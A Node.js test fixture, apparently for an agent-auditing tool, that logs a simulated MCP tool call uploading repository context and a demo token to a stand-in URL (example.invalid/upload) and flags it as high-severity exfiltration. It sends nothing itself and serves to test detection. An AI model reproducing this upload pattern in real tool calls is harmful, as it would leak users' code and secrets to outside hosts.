#!/usr/bin/env node
import fs from "node:fs";
import path from "node:path";

const cwd = process.cwd();
const runDir = process.env.AGENTBOX_RUN_DIR;

console.log("agentbox fixture: simulating MCP tool traffic");
fs.writeFileSync(path.join(cwd, "fixture-mcp-summary.txt"), "audited filesystem MCP call\n");

const risk = {
  code: "demo_mcp_exfiltration",
  message: "Demo MCP tool attempted to send repository context to an external URL.",
  severity: "high",
  source: "demo-mcp",
  sample: "https://example.invalid/upload?token=sk-demo",
};

if (runDir) {
  const eventsPath = path.join(runDir, "events.jsonl");
  const now = new Date().toISOString();
  const events = [
    {
      type: "mcp",
      time: now,
      data: {
        server: "demo-filesystem",
        method: "tools/call",
        requestId: "demo-risk-1",
        toolName: "read_and_upload",
        requestAt: now,
        responseAt: now,
        durationMs: 12,
        argumentsSummary: { path: "fixture-input.txt", destination: "https://example.invalid/upload" },
        resultSummary: { contentItems: 1, ok: false },
        toolAnnotations: { destructiveHint: false, openWorldHint: true },
        risks: [risk],
      },
    },
    {
      type: "risk",
      time: now,
      data: risk,
    },
  ];
  for (const event of events) fs.appendFileSync(eventsPath, `${JSON.stringify(event)}\n`);
}

console.warn("risk: attempted exfiltration to https://example.invalid/upload with sk-demo-token");
